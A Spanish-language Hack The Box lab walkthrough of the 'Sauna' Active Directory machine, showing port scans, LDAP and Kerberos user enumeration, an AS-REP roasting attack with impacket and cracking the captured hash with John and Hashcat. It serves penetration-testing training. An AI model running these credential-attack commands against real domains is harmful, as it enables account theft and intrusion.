---
title: "Sauna - Hack The Box"
date: 2024-10-16
draft: false
slug: "htb-writeup-sauna"
excerpt: "Esta fue una máquina sencilla. Empezamos analizando el servicio HTTP, ahí encontramos algunos nombres que después probamos con Kerbrute para poder ver qué usuarios existen en la máquina víctima, aunque también enumeramos el servicio LDAP con el que encontramos otro usuario. Al probar nuestra lista de usuarios, la volvemos a probar para poder aplicar el AS-REP Roasting Attack, con el que obtuvimos un hash TGT que crackeamos con JohnTheRipper y Hashcat, siendo de esta forma con la que ganamos acceso a la máquina vía WinRM. Una vez dentro, enumeramos la máquina y descubrimos que hay otro usuario del que no tenemos contraseña, por lo que usamos winPEAS para encontrar una vulnerabilidad que nos permita autenticarnos como ese nuevo usuario. De esta forma encontramos la contraseña en texto claro del nuevo usuario. Entrando a la máquina como el nuevo usuario, utilizamos BloodHound y SharpHound para descubrir una vía potencial para escalar privilegios, siendo que tenemos los permisos exactos para aplicar el DCSync Attack. Aplicamos el ataque con secretsdump de impacket y con mimikatz.exe, obteniendo así el hash NTLM del administrador con el que ganamos acceso a la máquina, dándola por terminada."
categories: ["HackTheBox", "Easy Machine"]
tags: ["Windows", "Active Directory", "DNS", "LDAP", "RPC", "Web Enumeration", "LDAP Enumeration", "Kerberos Enumeration", "Information Leakage", "AS-REP Roasting Attack", "Cracking Hash", "RPC Enumeration", "System Recognition (Windows)", "BloodHound and SharpHound Enumeration", "DCSync Attack", "Privesc - DCSync Attack", "OSCP Style"]
tools:
  - "ping"
  - "nmap"
  - "wappalizer"
  - "whatweb"
  - "crackmapexec"
  - "smbclient"
  - "smbmap"
  - "ldapsearch"
  - "dig"
  - "kerbrute_linux_amd64"
  - "impacket-GetNPUsers"
  - "JohnTheRipper"
  - "Hashcat"
  - "Evil-WinRM"
  - "rpcclient"
  - "net user"
  - "net localgroup"
  - "winPEASx64"
  - "BloodHound 4.3.1"
  - "SharpHound 1.1.1"
  - "impacket-secretsdump"
  - "mimikatz.exe"
links:
  - "https://github.com/peass-ng/PEASS-ng/releases/tag/20241011-2e37ba11"
  - "https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap#ldapsearch"
  - "https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html#as-rep-roasting"
showtoc: true
header:
  teaser: "/assets/images/htb-writeup-sauna/Sauna.png"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 10.10.10.175
PING 10.10.10.175 (10.10.10.175) 56(84) bytes of data.
64 bytes from 10.10.10.175: icmp_seq=1 ttl=127 time=74.3 ms
64 bytes from 10.10.10.175: icmp_seq=2 ttl=127 time=70.3 ms
64 bytes from 10.10.10.175: icmp_seq=3 ttl=127 time=70.1 ms
64 bytes from 10.10.10.175: icmp_seq=4 ttl=127 time=73.7 ms

--- 10.10.10.175 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3005ms
rtt min/avg/max/mdev = 70.145/72.102/74.296/1.893 ms
```
Por el TTL sabemos que la máquina usa **Windows**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.175 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-16 13:05 CST
Initiating SYN Stealth Scan at 13:05
Scanning 10.10.10.175 [65535 ports]
Discovered open port 80/tcp on 10.10.10.175
Discovered open port 139/tcp on 10.10.10.175
Discovered open port 135/tcp on 10.10.10.175
Discovered open port 53/tcp on 10.10.10.175
Discovered open port 445/tcp on 10.10.10.175
Discovered open port 3269/tcp on 10.10.10.175
Discovered open port 49697/tcp on 10.10.10.175
Discovered open port 636/tcp on 10.10.10.175
Discovered open port 593/tcp on 10.10.10.175
Discovered open port 49668/tcp on 10.10.10.175
Increasing send delay for 10.10.10.175 from 0 to 5 due to max_successful_tryno increase to 4
Discovered open port 49689/tcp on 10.10.10.175
Discovered open port 49673/tcp on 10.10.10.175
SYN Stealth Scan Timing: About 38.20% done; ETC: 13:06 (0:00:50 remaining)
Increasing send delay for 10.10.10.175 from 5 to 10 due to 11 out of 16 dropped probes since last increase.
Discovered open port 389/tcp on 10.10.10.175
Discovered open port 49676/tcp on 10.10.10.175
Discovered open port 5985/tcp on 10.10.10.175
Discovered open port 49674/tcp on 10.10.10.175
Discovered open port 88/tcp on 10.10.10.175
Discovered open port 3268/tcp on 10.10.10.175
Increasing send delay for 10.10.10.175 from 10 to 20 due to 11 out of 26 dropped probes since last increase.
Completed SYN Stealth Scan at 13:06, 80.08s elapsed (65535 total ports)
Nmap scan report for 10.10.10.175
Host is up, received user-set (0.33s latency).
Scanned at 2024-10-16 13:05:32 CST for 80s
Not shown: 65517 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
80/tcp    open  http             syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
49668/tcp open  unknown          syn-ack ttl 127
49673/tcp open  unknown          syn-ack ttl 127
49674/tcp open  unknown          syn-ack ttl 127
49676/tcp open  unknown          syn-ack ttl 127
49689/tcp open  unknown          syn-ack ttl 127
49697/tcp open  unknown          syn-ack ttl 127

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 80.18 seconds
           Raw packets sent: 393192 (17.300MB) | Rcvd: 90 (3.932KB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Hay varios puertos, podemos ver que nos vamos a enfrentar a un **Directorio Activo (AD)**, pero algo que me da curiosidad es que parece que hay puertos filtrados. Veamos qué información obtenemos de los puertos abiertos.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 53,80,88,135,139,389,445,593,636,3268,3269,5985,49668,49673,49674,49676,49689,49697 10.10.10.175 -oN targeted
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-16 13:08 CST
Nmap scan report for 10.10.10.175
Host is up (0.074s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0

| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Egotistical Bank :: Home
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-10-17 02:09:05Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49668/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:

| smb2-time: 
|   date: 2024-10-17T02:09:58
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 7h00m04s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 98.23 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Muy bien, el escaneo obtuvo el dominio y es **EGOTISTICAL-BANK.LOCAL**, así que regístralo en el `/etc/hosts`.

Vamos a empezar por enumerar la página web.

## Análisis de Vulnerabilidades {#Analisis}

### Analizando Servicio HTTP {#HTTP}

Entremos:

<p align="center">
<img src="/assets/images/htb-writeup-sauna/Captura1.png">
</p>

Veamos qué nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/htb-writeup-sauna/Captura2.png">
</p>

Las tecnologías como **IIS** y el servidor web de **Windows** nos indican que estamos contra una máquina **Windows**.

Probemos con **whatweb** para ver si nos da algo más:
```bash
whatweb http://10.10.10.175
http://10.10.10.175 [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[example@email.com,info@example.com], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.10.10.175], Microsoft-IIS[10.0], Script, Title[Egotistical Bank :: Home]
```

No hay otra cosa que nos sirva.

Investiguemos la página para ver qué más podemos encontrar.

Curiosamente, en la página principal se pueden ver algunas personas y las representan como clientes, pero si nos vamos al **About Us**, podemos ver a esas mismas personas, pero con su nombre, como si fueran usuarios:

<p align="center">
<img src="/assets/images/htb-writeup-sauna/Captura3.png">
</p>

<p align="center">
<img src="/assets/images/htb-writeup-sauna/Captura4.png">
</p>

Por último, solamente encontramos una publicación realizada por un usuario:

<p align="center">
<img src="/assets/images/htb-writeup-sauna/Captura5.png">
</p>

No encontramos nada más.

Apliquemos **Fuzzing** por si hay algo que se nos escapa.

### Fuzzing {#fuzz}

```bash
wfuzz -c -L --hc=404 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.10.175/FUZZ
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.175/FUZZ
Total requests: 220545

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                         
=====================================================================

000000536:   403        29 L     92 W       1233 Ch     "css"                                                                                                                                           
000002757:   403        29 L     92 W       1233 Ch     "fonts"                                                                                                                                         
000003659:   403        29 L     92 W       1233 Ch     "IMAGES"                                                                                                                                        
000008461:   403        29 L     92 W       1233 Ch     "CSS"                                                                                                                                           
000005568:   403        29 L     92 W       1233 Ch     "Fonts"                                                                                                                                         
000000002:   403        29 L     92 W       1233 Ch     "images"                                                                                                                                        
000000189:   403        29 L     92 W       1233 Ch     "Images"                                                                                                                                        
000045226:   200        683 L    1813 W     32797 Ch    "http://10.10.10.175/"                                                                                                                          

Total time: 0
Processed Requests: 220545
Filtered Requests: 220537
Requests/sec.: 0
```

| Parámetros | Descripción |
|---|---|
| *-c*       | Para ver el resultado en un formato colorido. |
| *--hc*     | Para no mostrar un código de estado en los resultados. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |

Ahora probemos con **gobuster**:
```bash
gobuster dir -u http://10.10.10.175/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 30
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.175/
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 150] [--> http://10.10.10.175/images/]
/Images               (Status: 301) [Size: 150] [--> http://10.10.10.175/Images/]
/css                  (Status: 301) [Size: 147] [--> http://10.10.10.175/css/]
/fonts                (Status: 301) [Size: 149] [--> http://10.10.10.175/fonts/]
/IMAGES               (Status: 301) [Size: 150] [--> http://10.10.10.175/IMAGES/]
/Fonts                (Status: 301) [Size: 149] [--> http://10.10.10.175/Fonts/]
/CSS                  (Status: 301) [Size: 147] [--> http://10.10.10.175/CSS/]
Progress: 220545 / 220546 (100.00%)
===============================================================
Finished
===============================================================
```

| Parámetros | Descripción |
|---|---|
| *-u*       | Para indicar la URL a utilizar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-t*       | Para indicar la cantidad de hilos a usar. |

Nada que podamos usar.

### Enumeración de DNS {#DNS}

Vamos a probar con **dig** qué información podemos obtener del **DNS**.

Primero, veamos si nos responde:
```bash
dig @10.10.10.175 EGOTISTICAL-BANK.LOCAL

; <<>> DiG 9.20.2-1-Debian <<>> @10.10.10.175 EGOTISTICAL-BANK.LOCAL
; (1 server found)
;; global options: +cmd
;; Got answer:
;; WARNING: .local is reserved for Multicast DNS
;; You are currently testing what happens when an mDNS query is leaked to DNS
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 8406
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;EGOTISTICAL-BANK.LOCAL.                IN      A

;; ANSWER SECTION:
EGOTISTICAL-BANK.LOCAL. 600     IN      A       10.10.10.175

;; Query time: 80 msec
;; SERVER: 10.10.10.175#53(10.10.10.175) (UDP)
;; WHEN: Wed Oct 16 16:33:39 CST 2024
;; MSG SIZE  rcvd: 67
```
Nos responde.

Probemos si hay correos registrados:
```bash
dig @10.10.10.175 EGOTISTICAL-BANK.LOCAL mx

; <<>> DiG 9.20.2-1-Debian <<>> @10.10.10.175 EGOTISTICAL-BANK.LOCAL mx
; (1 server found)
;; global options: +cmd
;; Got answer:
;; WARNING: .local is reserved for Multicast DNS
;; You are currently testing what happens when an mDNS query is leaked to DNS
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 6494
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;EGOTISTICAL-BANK.LOCAL.                IN      MX

;; AUTHORITY SECTION:
EGOTISTICAL-BANK.LOCAL. 3600    IN      SOA     sauna.EGOTISTICAL-BANK.LOCAL. hostmaster.EGOTISTICAL-BANK.LOCAL. 48 900 600 86400 3600

;; Query time: 72 msec
;; SERVER: 10.10.10.175#53(10.10.10.175) (UDP)
;; WHEN: Wed Oct 16 16:33:49 CST 2024
;; MSG SIZE  rcvd: 10
```
No hay ninguno.

Probemos si hay otros servidores:
```bash
dig @10.10.10.175 EGOTISTICAL-BANK.LOCAL ns

; <<>> DiG 9.20.2-1-Debian <<>> @10.10.10.175 EGOTISTICAL-BANK.LOCAL ns
; (1 server found)
;; global options: +cmd
;; Got answer:
;; WARNING: .local is reserved for Multicast DNS
;; You are currently testing what happens when an mDNS query is leaked to DNS
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 29206
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 3

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;EGOTISTICAL-BANK.LOCAL.                IN      NS

;; ANSWER SECTION:
EGOTISTICAL-BANK.LOCAL. 3600    IN      NS      sauna.EGOTISTICAL-BANK.LOCAL.

;; ADDITIONAL SECTION:
sauna.EGOTISTICAL-BANK.LOCAL. 3600 IN   A       10.10.10.175
sauna.EGOTISTICAL-BANK.LOCAL. 3600 IN   AAAA    dead:beef::38ba:d63a:ba8c:4e8c

;; Query time: 80 msec
;; SERVER: 10.10.10.175#53(10.10.10.175) (UDP)
;; WHEN: Wed Oct 16 16:33:56 CST 2024
;; MSG SIZE  rcvd: 115
```
Curiosamente, parece que hay una **IPv6**, quizá si aplicamos un **nuevo escaneo con nmap** usando esa **IPv6**, aparezcan nuevos puertos. Pero eso te lo dejo a ti para que lo pruebes.

Por último, apliquemos un **ataque de transferencia de zona** para obtener más información:
```bash
dig @10.10.10.175 EGOTISTICAL-BANK.LOCAL axfr

; <<>> DiG 9.20.2-1-Debian <<>> @10.10.10.175 EGOTISTICAL-BANK.LOCAL axfr
; (1 server found)
;; global options: +cmd
; Transfer failed.
```
Fue un ataque fallido.

### Enumeración de Servicio SMB {#SMB}

Veamos qué información obtenemos con **crackmapexec**:
```bash
crackmapexec smb 10.10.10.175
SMB     10.10.10.175    445    SAUNA     [*] Windows 10 / Server 2019 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
```
Nos dio el dominio, pero ese ya lo conocíamos.

Si analizamos bien el escaneo de servicios, nos había dicho que el **servicio SMB** necesita credenciales válidas para entrar.

Vamos a comprobarlo tratando de sacar una sesión nula con **smbclient** para listar los archivos compartidos:
```bash
smbclient -L //10.10.10.175// -N
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.175 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
No nos dejó.

Solo por si las dudas, tratemos con **smbmap**:
```bash
smbmap -H 10.10.10.175

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)

|---|---|---|---|---|---|---|---|---|
SMBMap - Samba Share Enumerator v1.10.4 | Shawn Evans - ShawnDEvans@gmail.com<mailto:ShawnDEvans@gmail.com>
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 0 authenticated session(s)                                                          
[*] Closed 1 connections
```
Tampoco, aunque podríamos intentarlo con una sesión nula, pero tampoco nos dejará.

### Enumeración de Servicio LDAP {#LDAP}

Veamos qué información podemos obtener con **ldapsearch**:
```bash
ldapsearch -x -H ldap://10.10.10.175 -s base namingcontexts
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingcontexts: DC=EGOTISTICAL-BANK,DC=LOCAL
namingcontexts: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
namingcontexts: CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
namingcontexts: DC=DomainDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
namingcontexts: DC=ForestDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```
No obtuvimos algo útil.

Vamos a indicarle que enumere todo lo que pueda (`-b`):
```bash
ldapsearch -x -H ldap://10.10.10.175 -b 'DC=EGOTISTICAL-BANK,DC=LOCAL'
# extended LDIF
#
# LDAPv3
# base <DC=EGOTISTICAL-BANK,DC=LOCAL> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# EGOTISTICAL-BANK.LOCAL
dn: DC=EGOTISTICAL-BANK,DC=LOCAL
objectClass: top
objectClass: domain
objectClass: domainDNS
distinguishedName: DC=EGOTISTICAL-BANK,DC=LOCAL
instanceType: 5
whenCreated: 20200123054425.0Z
whenChanged: 20241017015043.0Z
subRefs: DC=ForestDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
subRefs: DC=DomainDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
subRefs: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
uSNCreated: 4099
dSASignature:: AQAAACgAAAAAAAAAAAAAAAAAAAAAAAAAQL7gs8Yl7ESyuZ/4XESy7A==
uSNChanged: 98336
name: EGOTISTICAL-BANK
...
...
...
# Managed Service Accounts, EGOTISTICAL-BANK.LOCAL
dn: CN=Managed Service Accounts,DC=EGOTISTICAL-BANK,DC=LOCAL

# Keys, EGOTISTICAL-BANK.LOCAL
dn: CN=Keys,DC=EGOTISTICAL-BANK,DC=LOCAL

# TPM Devices, EGOTISTICAL-BANK.LOCAL
dn: CN=TPM Devices,DC=EGOTISTICAL-BANK,DC=LOCAL

# Builtin, EGOTISTICAL-BANK.LOCAL
dn: CN=Builtin,DC=EGOTISTICAL-BANK,DC=LOCAL

# Hugo Smith, EGOTISTICAL-BANK.LOCAL
dn: CN=Hugo Smith,DC=EGOTISTICAL-BANK,DC=LOCAL

# search reference
ref: ldap://ForestDnsZones.EGOTISTICAL-BANK.LOCAL/DC=ForestDnsZones,DC=EGOTIST
 ICAL-BANK,DC=LOCAL
...
...
...
```
Nos soltó bastante información, pero lo importante es que nos dio un usuario válido.

Apliquemos un filtro para ver solamente el campo `dn: CN=`:
```bash
ldapsearch -x -H ldap://10.10.10.175 -b 'DC=EGOTISTICAL-BANK,DC=LOCAL' | grep "dn: CN="
dn: CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL
dn: CN=Computers,DC=EGOTISTICAL-BANK,DC=LOCAL
dn: CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL
dn: CN=LostAndFound,DC=EGOTISTICAL-BANK,DC=LOCAL
dn: CN=Infrastructure,DC=EGOTISTICAL-BANK,DC=LOCAL
dn: CN=ForeignSecurityPrincipals,DC=EGOTISTICAL-BANK,DC=LOCAL
dn: CN=Program Data,DC=EGOTISTICAL-BANK,DC=LOCAL
dn: CN=NTDS Quotas,DC=EGOTISTICAL-BANK,DC=LOCAL
dn: CN=Managed Service Accounts,DC=EGOTISTICAL-BANK,DC=LOCAL
dn: CN=Keys,DC=EGOTISTICAL-BANK,DC=LOCAL
dn: CN=TPM Devices,DC=EGOTISTICAL-BANK,DC=LOCAL
dn: CN=Builtin,DC=EGOTISTICAL-BANK,DC=LOCAL
dn: CN=Hugo Smith,DC=EGOTISTICAL-BANK,DC=LOCAL
```
No salieron más usuarios, pero con ese es más que suficiente.

### Enumeración de Servicio Kerberos {#Kerberos}

Como ya tenemos un usuario, podemos probar si este existe dentro del **servicio Kerberos**.

Ya en otras máquinas que fueron **AD**, vimos cómo es que manejan los nombres de los usuarios. Esto lo podemos aplicar aquí de la siguiente forma:
```bash
nano users.txt
hugosmith
h.smith
hugo.smith
hsmith
```

Probemos con esta lista de usuarios para ver si alguno es válido, y si obtenemos uno, también descubriríamos qué formato es el que usan para representar a sus usuarios.

Usaremos la herramienta **kerbrute**, indicándole que usaremos el ataque **userenum**, la IP de la máquina, el dominio y la lista de usuarios:
```bash
./kerbrute_linux_amd64 userenum --dc 10.10.10.175 -d EGOTISTICAL-BANK.LOCAL users.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 10/16/24 - Ronnie Flathers @ropnop

2024/10/16 13:30:25 >  Using KDC(s):
2024/10/16 13:30:25 >   10.10.10.175:88

2024/10/16 13:30:25 >  [+] VALID USERNAME:       hsmith@EGOTISTICAL-BANK.LOCAL
2024/10/16 13:30:25 >  Done! Tested 4 usernames (1 valid) in 0.081 seconds
```
Excelente, ya sabemos cuál es el formato de usuarios y que existe el usuario **hsmith**.

Si recuerdas, vimos en la página web que hay algunos nombres en la sección **About Us**.

Pues, como ya sabemos el formato de usuarios, vamos a copiar esos nombres para comprobar si son usuarios existentes:
```bash
nano users.txt
hsmith
fsmith
scoins
btaylor
hbear
sdriver
skerb
```

Ahora, usemos el mismo comando que usamos con **kerbrute**:
```bash
./kerbrute_linux_amd64 userenum --dc 10.10.10.175 -d EGOTISTICAL-BANK.LOCAL users.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 10/16/24 - Ronnie Flathers @ropnop

2024/10/16 13:38:14 >  Using KDC(s):
2024/10/16 13:38:14 >   10.10.10.175:88

2024/10/16 13:38:14 >  [+] VALID USERNAME:       hsmith@EGOTISTICAL-BANK.LOCAL
2024/10/16 13:38:14 >  [+] VALID USERNAME:       fsmith@EGOTISTICAL-BANK.LOCAL
2024/10/16 13:38:14 >  Done! Tested 7 usernames (2 valid) in 0.086 seconds
```
Tenemos otro usuario llamado **fsmith**.

Una vez que tengamos usuarios válidos, podemos probar el **AS-REP Roasting Attack** para ver si podemos obtener un **TGT**.

## Explotación de Vulnerabilidades {#Explotacion}

### Aplicando AS-REP Roasting Attack {#ASREP}

Esa misma lista de usuarios la podemos ocupar para aplicar este ataque.

Para hacerlo, necesitaremos la herramienta **GetNPUsers de impacket**.

Le indicaremos que no tenemos contraseñas, que usé nuestra lista de usuarios y el dominio:
```bash
impacket-GetNPUsers -no-pass -usersfile users.txt EGOTISTICAL-BANK.LOCAL/
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] User hsmith doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:5407441c36e1fd63c2ef9aa177a0d037$1f69349d02...
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
```
Muy bien, obtuvimos el **TGT** del usuario **fsmith**.

Vamos a crackearlo, pero esta vez, lo haremos de dos formas.

#### Crackeando Hash TGT con JohnTheRipper {#JohnTR}

Copia el **hash** del **TGT** y guárdalo en un archivo.

Con **JonhTheRipper**, le indicaremos que utilice el **rockyou.txt** y el **hash** para que lo trate de crackear:
```bash
john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 SSE2 4x])
Will run 5 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Thestrokes23     ($krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL)     
1g 0:00:00:19 DONE (2024-10-16 13:39) 0.05096g/s 537149p/s 537149c/s 537149C/s Thomas30..Thenook1
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
Tardo un poquito, pero ahí está la contraseña en texto claro.

#### Crackeando Hash TGT con Hashcat {#Hashcat}

Copia el **hash** del **TGT** y guárdalo en un archivo.

Con **hashcat** le indicaremos que use el **modo 18200** (que es para **hashes krb5asrep**), le indicamos que use el **rockyou.txt** y que ignore cualquier advertencia (`--force`):
```bash
hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt --force
hashcat (v6.2.6) starting
...
...
$krb5asrep$23$fsmith@EG...a376dd90506fc9fc558a931d2cb28989b1a195321cef2f33025c0b:Thestrokes23
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:5407441...025c0b
Time.Started.....: Wed Oct 16 16:16:45 2024, (17 secs)
Time.Estimated...: Wed Oct 16 16:17:02 2024, (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   625.5 kH/s (3.26ms) @ Accel:1024 Loops:1 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10542080/14344385 (73.49%)
Rejected.........: 0/10542080 (0.00%)
Restore.Point....: 10536960/14344385 (73.46%)
